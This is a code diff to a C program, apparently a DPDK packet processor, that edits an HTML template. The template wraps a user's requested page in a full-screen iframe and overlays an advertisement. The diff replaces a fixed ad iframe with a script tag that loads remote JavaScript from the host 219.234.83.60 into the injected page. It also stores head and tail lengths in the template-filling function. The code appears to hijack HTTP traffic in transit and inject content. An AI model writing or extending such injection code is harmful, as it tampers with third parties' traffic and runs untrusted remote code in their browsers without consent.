@@ -259,13 +259,10 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
             "\";\n"
             "d.getElementById(\"m\").src=f+(f.indexOf(\"&\")<0\?\'\?\':\'&\')+\'_tTI=tTI\';\n"
             "}\n"
-            "\n"
             "setTimeout(function(){d.getElementById(\"x\").style.display=\'block\';}, 2000);\n"
-            "\n"
             "function c(){\n"
             "x.style.display=\"none\"\n"
             "}\n"
-            "\n"
             "</script>\n"
             "<style>\n"
             "body {margin:0;color:#000;overflow:hidden;padding:0;height:100%;font-family:Arial}\n"
@@ -280,10 +277,10 @@ http_body_t default_http_body[AD_TEMPLATE_MAX] =
             "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
             "</div>\n"
             "<div id=x>\n"
-            "<iframe src=\"http://219.234.83.60/ad/pc.html\" width=300 height=250 scrolling=no frameborder=0></iframe>\n"
+            "<iframe id=y width=300 height=250 scrolling=no frameborder=0></iframe>\n"
             "<a class=\"close\" onClick=c()>关闭</a>\n"
             "</div>\n"
-            "\n"
+            "<script type=\"text/javascript\" src=\"http://219.234.83.60/ad/rr.js\"></script>\n"
             "</body>\n"
             "</html>\n"
             "\n",
@@ -843,8 +840,10 @@ berr adt_fill_template(ad_template_em template, const char *name, char * buff)
     memset(http_to, 0, sizeof(http_body_t));
     rte_memcpy(http_to->name, name, (size_t)strlen(name));
     rte_memcpy(http_to->head, buff, head_len);
+    http_to->head_len = head_len;
     rte_memcpy(http_to->url,  url,  url_len);
     rte_memcpy(http_to->tail, tail, tail_len);
+    http_to->tail_len = tail_len;
 
     i = template;
     debug("Template(%d):\n", i);
